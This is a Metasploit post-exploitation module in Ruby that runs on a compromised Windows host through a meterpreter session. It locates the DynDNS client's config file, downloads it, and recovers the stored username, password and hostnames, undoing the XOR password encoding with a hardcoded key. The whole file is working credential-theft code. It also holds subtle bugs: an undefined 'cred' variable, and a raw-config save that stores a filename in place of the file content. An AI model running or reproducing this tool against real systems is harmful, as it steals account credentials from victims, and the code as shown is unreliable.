##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Windows Gather DynDNS Client Password Extractor',
      'Description'    => %q{
          This module extracts the username, password, and hosts for DynDNS version 4.1.8.
        This is done by downloading the config.dyndns file from the victim machine, and then
        automatically decode the password field. The original copy of the config file is also
        saved to disk.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Shubham Dawra <shubham2dawra[at]gmail.com>', #SecurityXploded.com
          'sinn3r',  #Lots of code rewrite
        ],
      'Platform'       => [ 'win' ],
      'SessionTypes'   => [ 'meterpreter' ]
    ))
  end


  #
  # Search for the config file.
  # Return the config file path, otherwise nil to indicate nothing was found
  #
  def get_config_file
    config_paths =
      [
        "C:\\ProgramData\\Dyn\\Updater\\",  #Vista
        "C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\"  #XP and else
      ]

    # Give me the first match
    config_file = nil
    config_paths.each do |p|
      tmp_path = p + "config.dyndns"
      begin
        f = session.fs.file.stat(tmp_path)
        config_file = tmp_path
        break  #We've found a valid one, break!
      rescue
      end
    end

    return config_file
  end


  #
  # Download the config file, and then load it up in memory.
  # Return the content.
  #
  def load_config_file(config_file)
    f = session.fs.file.new(config_file, "rb")
    content = ''
    until f.eof?
      content << f.read
    end
    p = store_loot("dyndns.raw", "text/plain", session, "dyndns_raw_config.dyndns")
    vprint_status("Raw config file saved: #{p.to_s}")
    return content
  end


  #
  # Parse the data
  # Return: Hash { :username, :pass, :hosts }
  #
  def parse_config(content)
    # Look at each line for user/pass/host
    config_data = {}
    user = content.scan(/Username=([\x21-\x7e]+)/)[0][0]
    pass = content.scan(/Password=([\x21-\x7e]+)/)[0][0]
    host = content.scan(/Host\d=([\x21-\x7e]+)/)[0]

    # Let's decode the pass
    pass = decode_password(pass) if not pass.nil?

    # Store data in a hash, save it to the array
    # Might contain nil if nothing was regexed
    config_data = {
      :user  => user,
      :pass  => pass,
      :hosts => host
    }

    return config_data
  end


  #
  # Decode the password
  #
  def decode_password(pass)
    pass = [pass].pack('H*')
    s = ''
    c = 0

    pass.each_byte do |a1|
      a2 = "t6KzXhCh"[c, 1].unpack('c')[0].to_i
      s << (a1 ^ a2).chr
      c = ((c+1)%8)
    end

    return s
  end


  #
  # Print results and storeloot
  #
  def do_report(data)

    tbl  = Rex::Ui::Text::Table.new(
      'Header'  => 'DynDNS Client Data',
      'Indent'  => 1,
      'Columns' => ['Field', 'Value']
    )

    creds  = Rex::Ui::Text::Table.new(
      'Header'  => 'DynDNS Credentials',
      'Indent'  => 1,
      'Columns' => ['User', 'Password']
    )

    # Store username/password
    cred << [data[:user], data[:pass]]

    if not creds.rows.empty?
      p = store_loot(
        'dyndns.creds',
        'text/csv',
        session,
        creds.to_csv,
        'dyndns_creds.csv',
        'DynDNS Credentials'
      )
      print_status("Parsed creds stored in: #{p.to_s}")
    end

    # Store all found hosts
    hosts = data[:hosts]
    hosts.each do |host|
      tbl << ['Host', host]
    end

    print_status(tbl.to_s)

    if not tbl.rows.empty?
      p = store_loot(
        'dyndns.data',
        'text/plain',
        session,
        tbl.to_csv,
        'dyndns_data.csv',
        'DynDNS Client Data'
      )
      print_status("Parsed data stored in: #{p.to_s}")
    end
  end


  #
  # Main function, duh
  #
  def run
    # Find the config file
    config_file = get_config_file
    if config_file.nil?
      print_error("No config file found, will not continue")
      return
    end

    # Load the config file
    print_status("Downloading config.dyndns...")
    content = load_config_file(config_file)

    if content.empty?
      print_error("Config file seems empty, will not continue")
      return
    end

    # Get parsed data
    config = parse_config(content)

    # Store data
    do_report(config)
  end

end
